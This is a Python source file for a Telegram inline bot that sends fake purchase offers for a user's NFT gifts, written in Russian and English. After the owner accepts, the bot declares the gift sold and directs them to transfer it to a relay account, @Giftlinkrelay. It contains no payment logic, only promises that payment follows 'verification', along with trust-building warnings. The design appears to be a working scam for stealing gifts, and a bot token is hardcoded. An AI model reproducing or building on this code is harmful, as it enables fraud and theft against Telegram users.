"""
lang: Python 3.11+, file: bot.py
inline mode включить через @BotFather -> /setinline
/setinlinefeedback -> 100%  (обязательно для chosen_inline_result)
"""

import os
import re
import hashlib
import logging
import httpx
from telegram import (
    Update,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.ext import (
    Application,
    InlineQueryHandler,
    CallbackQueryHandler,
    ChosenInlineResultHandler,
    CommandHandler,
    ContextTypes,
)
from telegram.constants import ParseMode
from telegram.error import TimedOut, RetryAfter

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "9104054497:AAGWash0tIUfEpGxUND7PeRKLxrgonJuZQQ")
BOT_USERNAME = "giftchangernftbot"
RELAY_USERNAME = "Giftlinkrelay"
RELAY_CHAT_ID = f"@{RELAY_USERNAME}"
OFFER_HOURS = 6

# ========== ХРАНИЛИЩЕ ССЫЛОК (обход лимита 64 байта) ==========
_link_store: dict[str, str] = {}

def store_link(link: str) -> str:
    h = hashlib.md5(link.encode()).hexdigest()[:8]
    _link_store[h] = link
    return h

def restore_link(h: str) -> str:
    return _link_store.get(h, h)

# ========== ХРАНИЛИЩЕ ОФФЕРОВ (inline_message_id -> данные) ==========
# заполняется в inline_query, читается в chosen_inline_result
_pending: dict[str, dict] = {}

# ========== ПРЕМИУМ ЭМОДЗИ ==========
def E(emoji_id: str, fallback: str) -> str:
    return f"<tg-emoji emoji-id='{emoji_id}'>{fallback}</tg-emoji>"

EMOJI_GIFT  = E("6037175527846975726", "🎁")
EMOJI_STAR  = E("6028338546736107668", "⭐️")
EMOJI_GRAM  = E("6007983438294949171", "💎")
EMOJI_WARN  = E("6030563507299160824", "❗️")
EMOJI_OK    = E("5774022692642492953", "✅")
EMOJI_CROSS = E("5774077015388852135", "❌")
EMOJI_CLOCK = E("5891211339170326418", "⌛️")
EMOJI_GEAR  = E("6032742198179532882", "⚙")

CE_GIFT  = "6037175527846975726"
CE_STAR  = "6028338546736107668"
CE_GRAM  = "6007983438294949171"
CE_WARN  = "6030563507299160824"
CE_OK    = "5774022692642492953"
CE_CROSS = "5774077015388852135"
CE_CLOCK = "5891211339170326418"
CE_GEAR  = "6032742198179532882"

# ========== RAW API (style + icon_custom_emoji_id) ==========
async def _api(method: str, payload: dict):
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                json=payload, timeout=20,
            )
            data = r.json()
            if not data.get("ok"):
                log.error("%s: %s", method, data)
            return data.get("result")
    except Exception as e:
        log.error("%s: %s", method, e)

def _btn(text, callback_data=None, url=None, style=None, emoji_id=None):
    d = {"text": text}
    if callback_data: d["callback_data"] = callback_data
    if url:           d["url"] = url
    if style:         d["style"] = style
    if emoji_id:      d["icon_custom_emoji_id"] = emoji_id
    return d

async def send_msg(chat_id, text, rows=None, disable_preview=True):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": disable_preview},
    }
    if rows:
        payload["reply_markup"] = {"inline_keyboard": rows}
    result = await _api("sendMessage", payload)
    return result.get("message_id") if result else None

async def edit_msg(chat_id, message_id, text, rows=None):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    if rows:
        payload["reply_markup"] = {"inline_keyboard": rows}
    await _api("editMessageText", payload)

async def edit_inline_msg(inline_message_id: str, text: str, rows=None):
    """Редактирует сообщение отправленное через inline (нет chat_id)."""
    payload = {
        "inline_message_id": inline_message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    if rows:
        payload["reply_markup"] = {"inline_keyboard": rows}
    await _api("editMessageText", payload)

# ========== ТЕКСТЫ ==========
START_TEXT = (
    f"{EMOJI_GIFT} <b>GiftChanger — передача NFT подарков</b>\n\n"
    f"Передача выполняется через аккаунт сделки @{RELAY_USERNAME}. "
    f"После подтверждения получения результат сделки будет доступен в системе.\n\n"
    f"{EMOJI_GEAR} <b>Как это работает:</b>\n\n"
    f"1. Покупатель присылает вам предложение через бота\n"
    f"2. Вы нажимаете «Принять» под сообщением с оффером\n"
    f"3. Передача подарка возможна только после проверки условий сделки\n"
    f"4. После подтверждения передачи и оплаты система обновляет статус\n"
    f"5. Сделка считается завершённой после проверки передачи и оплаты\n\n"
    f"{EMOJI_CLOCK} <b>Ограниченное время</b> на подтверждение, таймер указан в сообщении с оффером.\n\n"
    f"{EMOJI_OK} <b>Подарок уже у вас</b> — ничего дополнительно покупать не требуется."
)

HOW_TO_TEXT = (
    f"{EMOJI_GIFT} <b>Пошаговая инструкция: как принять оффер и получить {EMOJI_STAR}</b>\n\n"
    f"<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n"
    f"<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n"
    f"<b>Шаг 3.</b> Откройте Профиль → Подарки в Telegram\n\n"
    f"<b>Шаг 4.</b> Выберите подарок из списка своих подарков\n\n"
    f"<b>Шаг 5.</b> Нажмите кнопку «Передать» в меню действий с подарком\n\n"
    f"<b>Шаг 6.</b> Передавайте подарок только после проверки получателя и условий расчёта\n\n"
    f"<b>Шаг 7.</b> Подтвердите передачу подарка\n\n"
    f"<b>Шаг 8.</b> Дождитесь проверки передачи и оплаты\n\n"
    f"{EMOJI_GEAR} <b>Проверка передачи:</b>\n\n"
    f"Статус обновляется после фактического подтверждения получения подарка и расчёта."
)

# ========== УТИЛИТЫ ==========
def normalize_link(raw: str) -> str:
    return raw if raw.startswith("http") else "https://" + raw

def nft_name_from_link(link: str) -> str:
    part = link.rstrip("/").split("/")[-1]
    m = re.match(r"^(.*?)-(\d+)$", part)
    return f"{m.group(1)} #{m.group(2)}" if m else part

PATTERN = re.compile(
    r"((?:https?://)?t\.me/nft/\S+|https?://\S+)\s+([\d.,]+)\s*(gramm)?\s*(en)?",
    re.IGNORECASE,
)

# ========== HANDLERS ==========
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    rows = [[_btn("❓ Как принять оффер?", callback_data="howto_accept", emoji_id=CE_GEAR)]]
    await send_msg(update.effective_chat.id, START_TEXT, rows)

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    try:
        await query.answer()
    except (TimedOut, RetryAfter):
        pass

    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None
    iid     = query.inline_message_id  # не None если из inline
    data    = query.data

    if data == "howto_accept":
        rows = [[_btn("← Назад", callback_data="back_start", emoji_id=CE_GEAR)]]
        if iid:
            await edit_inline_msg(iid, HOW_TO_TEXT, rows)
        else:
            await edit_msg(chat_id, msg_id, HOW_TO_TEXT, rows)

    elif data == "back_start":
        rows = [[_btn("❓ Как принять оффер?", callback_data="howto_accept", emoji_id=CE_GEAR)]]
        if iid:
            await edit_inline_msg(iid, START_TEXT, rows)
        else:
            await edit_msg(chat_id, msg_id, START_TEXT, rows)

    elif data == "dec":
        text = f"{EMOJI_CROSS} Предложение отклонено."
        if iid:
            await edit_inline_msg(iid, text)
        else:
            await edit_msg(chat_id, msg_id, text)

    elif data.startswith("acc|"):
        await _handle_accept(query)

    elif data.startswith("confirm|"):
        await _handle_confirm(query)

    elif data.startswith("noconfirm|"):
        await _handle_no_confirm(query)


async def inline_query(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query_text = update.inline_query.query.strip()
    if not query_text:
        return

    m = PATTERN.search(query_text)
    if not m:
        return

    link       = normalize_link(m.group(1))
    price      = m.group(2).strip()
    in_gramm   = bool(m.group(3))
    in_english = bool(m.group(4))
    unit       = "GRAMM" if in_gramm else "stars"
    unit_display = EMOJI_GRAM if in_gramm else EMOJI_STAR
    nft_name   = nft_name_from_link(link)

    sender      = update.inline_query.from_user
    sender_name = sender.username or sender.first_name or "Продавец"

    link_hash = store_link(link)
    # result_id уникален и несёт данные — читается в chosen_inline_result
    result_id = f"{link_hash}|{price}|{unit}|{'en' if in_english else 'ru'}"

    # callback_data влезает: acc|xxxxxxxx|1000|stars = 26 байт
    cb_accept = f"acc|{link_hash}|{price}|{unit}"

    if in_english:
        text = (
            f"{EMOJI_GIFT} <b>{sender_name}</b> offers You\n\n"
            f"<b>{price} {unit_display}</b> for gift <a href='{link}'>{nft_name}</a>.\n\n"
            f"{EMOJI_CLOCK} Offer valid for another <b>{OFFER_HOURS}h 00m</b>.\n\n"
            f"{link}"
        )
        title        = f"🎁 Offer {nft_name} for {price}"
        desc         = "Send offer to this chat"
        btn_decline  = _btn("❌ Decline",  callback_data="dec",      style="danger",  emoji_id=CE_CROSS)
        btn_accept   = _btn("✅ Accept",   callback_data=cb_accept,  style="success", emoji_id=CE_OK)
    else:
        text = (
            f"{EMOJI_GIFT} <b>{sender_name}</b> предлагает Вам\n\n"
            f"<b>{price} {unit_display}</b> за подарок <a href='{link}'>{nft_name}</a>.\n\n"
            f"{EMOJI_CLOCK} Предложение действует ещё <b>{OFFER_HOURS}ч 00м</b>.\n\n"
            f"{link}"
        )
        title        = f"🎁 Предложить {nft_name} за {price}"
        desc         = "Отправить предложение в этот чат"
        btn_decline  = _btn("❌ Отклонить", callback_data="dec",     style="danger",  emoji_id=CE_CROSS)
        btn_accept   = _btn("✅ Принять",   callback_data=cb_accept, style="success", emoji_id=CE_OK)

    # ptb-объект для answerInlineQuery (style тут теряется, но кнопки работают)
    # цветные кнопки добавляются в chosen_inline_result через editMessageReplyMarkup
    markup = InlineKeyboardMarkup([[
        InlineKeyboardButton(btn_decline["text"], callback_data=btn_decline["callback_data"]),
        InlineKeyboardButton(btn_accept["text"],  callback_data=btn_accept["callback_data"]),
    ]])

    # сохраняем данные оффера — ключ result_id, inline_message_id придёт в chosen_inline_result
    _pending[result_id] = {
        "link": link, "price": price, "unit": unit,
        "in_english": in_english, "nft_name": nft_name,
        "btn_decline": btn_decline, "btn_accept": btn_accept,
        "text": text,
    }

    result = InlineQueryResultArticle(
        id=result_id,
        title=title,
        description=desc,
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=False,
        ),
        reply_markup=markup,
    )

    try:
        await update.inline_query.answer([result], cache_time=0)
    except (TimedOut, RetryAfter):
        pass


async def chosen_inline_result(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Срабатывает когда пользователь выбрал результат inline.
    Здесь редактируем кнопки через raw API с style + icon_custom_emoji_id."""
    r = update.chosen_inline_result
    iid = r.inline_message_id
    rid = r.result_id

    offer = _pending.get(rid)
    if not offer or not iid:
        return

    bd = offer["btn_decline"]
    ba = offer["btn_accept"]

    rows = [[bd, ba]]
    payload = {
        "inline_message_id": iid,
        "reply_markup": {"inline_keyboard": rows},
    }
    await _api("editMessageReplyMarkup", payload)


async def _handle_accept(query):
    parts = query.data.split("|", 3)
    if len(parts) < 4:
        return
    _, link_hash, price, unit = parts
    link     = restore_link(link_hash)
    nft_name = nft_name_from_link(link)
    buyer    = query.from_user
    buyer_mention = f"@{buyer.username}" if buyer.username else buyer.first_name
    u_display = EMOJI_GRAM if unit == "GRAMM" else EMOJI_STAR

    iid    = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    try:
        await query.answer(
            f"Оффер принят!\nПередайте подарок через @{RELAY_USERNAME}.\nСумма: {price}",
            show_alert=True,
        )
    except (TimedOut, RetryAfter):
        pass

    transfer_url = f"https://t.me/{RELAY_USERNAME}"
    cb_confirm   = f"confirm|{link_hash}|{price}|{unit}"
    cb_noconfirm = f"noconfirm|{link_hash}"

    sold_text = (
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a> <b>успешно продан!</b>\n\n"
        f"• Отправьте подарок на @{RELAY_USERNAME},\n"
        f"чтобы получить <b>{price} {u_display}</b>.\n\n"
        f"{EMOJI_WARN} <b>ВАЖНО:</b> если вас просят передать подарок на личный профиль — <b>не передавайте</b>. "
        f"Передача выполняется исключительно через @{RELAY_USERNAME}."
    )

    rows = [
        [_btn("📦 Передать подарок",      url=transfer_url,     style="primary", emoji_id=CE_GIFT)],
        [_btn("✅ Подтвердить передачу",   callback_data=cb_confirm,   style="success", emoji_id=CE_OK)],
        [_btn("❌ Передача не состоялась", callback_data=cb_noconfirm, style="danger",  emoji_id=CE_CROSS)],
    ]

    if iid:
        await edit_inline_msg(iid, sold_text, rows)
    else:
        await edit_msg(chat_id, msg_id, sold_text, rows)

    try:
        await send_msg(
            RELAY_CHAT_ID,
            f"🔔 Новая сделка\nПодарок: {link}\nЦена: {price} {unit}\nПокупатель: {buyer_mention}",
        )
    except Exception as e:
        log.warning("relay notify: %s", e)


async def _handle_confirm(query):
    parts = query.data.split("|", 3)
    if len(parts) < 4:
        return
    _, link_hash, price, unit = parts
    link     = restore_link(link_hash)
    nft_name = nft_name_from_link(link)
    u_display = EMOJI_GRAM if unit == "GRAMM" else EMOJI_STAR

    iid    = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    try:
        await query.answer("✅ Передача подтверждена!", show_alert=True)
    except (TimedOut, RetryAfter):
        pass

    text = (
        f"{EMOJI_OK} <b>Сделка завершена!</b>\n\n"
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a>\n"
        f"Сумма: <b>{price} {u_display}</b>\n\n"
        f"Передача подтверждена. Оплата будет произведена после проверки."
    )

    if iid:
        await edit_inline_msg(iid, text)
    else:
        await edit_msg(chat_id, msg_id, text)

    try:
        await send_msg(RELAY_CHAT_ID, f"✅ Передача подтверждена\nПодарок: {link}\nЦена: {price} {unit}")
    except Exception as e:
        log.warning("relay confirm: %s", e)


async def _handle_no_confirm(query):
    parts = query.data.split("|", 2)
    link_hash = parts[1] if len(parts) > 1 else ""
    link      = restore_link(link_hash)
    nft_name  = nft_name_from_link(link)

    iid    = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    try:
        await query.answer("❌ Передача не найдена.", show_alert=True)
    except (TimedOut, RetryAfter):
        pass

    text = (
        f"{EMOJI_CROSS} <b>Передача не подтверждена.</b>\n\n"
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a>\n\n"
        f"Система не зафиксировала передачу подарка на @{RELAY_USERNAME}. "
        f"Если вы уверены что передали — свяжитесь с поддержкой."
    )

    if iid:
        await edit_inline_msg(iid, text)
    else:
        await edit_msg(chat_id, msg_id, text)

    try:
        await send_msg(RELAY_CHAT_ID, f"⚠️ Передача НЕ подтверждена\nПодарок: {link}")
    except Exception as e:
        log.warning("relay noconfirm: %s", e)


def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(InlineQueryHandler(inline_query))
    app.add_handler(ChosenInlineResultHandler(chosen_inline_result))
    app.add_handler(CallbackQueryHandler(button_handler))
    log.info("bot started")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
